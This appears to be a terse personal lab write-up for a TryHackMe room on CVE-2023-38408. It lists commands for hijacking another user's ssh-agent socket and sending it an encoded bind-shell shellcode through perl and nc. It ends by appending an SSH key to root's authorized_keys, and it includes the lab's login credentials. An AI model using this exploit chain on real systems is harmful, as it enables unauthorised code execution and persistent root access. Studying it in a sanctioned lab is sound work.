## 08082023Tue

[TryHackMe | CVE-2023-38408](https://tryhackme.com/room/cve202338408)

```
Learn how to move laterally abusing libraries' side effects in Ubuntu (CVE-2023-38408)
```

![[Pasted image 20230808091957.png]]
![[Pasted image 20230808092751.png]]

```
ssh redqueenrebel@10.10.223.103
```

```
DownTheRabbitHole!
```

![[Pasted image 20230808093033.png]]
![[Pasted image 20230808093323.png]]
![[Pasted image 20230808093522.png]]
![[Pasted image 20230808093607.png]]

```
eval `ssh-agent -s`
```
![[Pasted image 20230808094728.png]]

```
echo /tmp/ssh-*/agent.*
```

![[Pasted image 20230808104049.png]]

```
/tmp/ssh-zQp5Si8DdmJ0/agent.1144
```

```
export SSH_AUTH_SOCK=/tmp/ssh-zQp5Si8DdmJ0/agent.1144
```

![[Pasted image 20230808104604.png]]

```
ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
```
![[Pasted image 20230808104806.png]]

```
SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'
```

```
(perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
```

```
ps -aux | grep pkcs11-helperalice
```
![[Pasted image 20230808104959.png]]

```
sudo gdb -p 2345
```
![[Pasted image 20230808105146.png]]



![[Pasted image 20230808110134.png]]

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCs4FT0kCeBfQ1co/PeApZn3NmZ68mUwEEbtP598IcBBDgpe+AauGtOVNxsptmZD26yjhTXp4RJgrreUgPJQ8ICDUvASD/2W8GOl5XpYddbrcHy+djyViQV/69VskB2Y9LCobbkYPBUjIKlObqgamM7HhcNO3Zu65AAtbu+31+N+swygYjTRB37cjQOLgI7FM9nmuhyb8uSMtttTJRD7ybXPfiHV8YxLENuJU0BGggc9i/hXKQKwhEvnliiqw/XdpK/JyT6t65DFvYYkT21bPHpBDMNzPauUgr2yagKMFNe8HFQfk/QibTcLMeV0JmCGeOcv8oJP/T4xJnnoetMvZGEPZ4hXH7E3n2wksLjuF2se61/c+SIh6Zm+gUYQESTAmmbRPeTj7RcZPRN22knpSyu76eZKBf/dmHYXQlIk1gKsouFdposOpxYRJ4Wt97uEPihW/wzzT+QPcLyYoGpbFXJmpqNaOBVJw1n0KqB98dL5Ixa32FKTCzaBPHkDmK/I2M= alice@workstation" >> /root/.ssh/authorized_keys
```

![[Pasted image 20230808110352.png]]

